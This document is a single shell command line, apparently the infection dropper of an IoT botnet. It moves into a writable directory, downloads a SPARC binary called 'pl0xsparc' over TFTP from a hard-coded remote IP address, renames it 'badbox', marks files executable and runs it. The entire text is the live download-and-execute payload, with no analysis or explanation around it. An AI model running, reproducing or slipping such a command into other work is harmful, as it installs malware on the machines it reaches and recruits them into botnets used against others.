cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r pl0xsparc -g 212.237.53.46;cat pl0xsparc >badbox;chmod +x *;./badbox
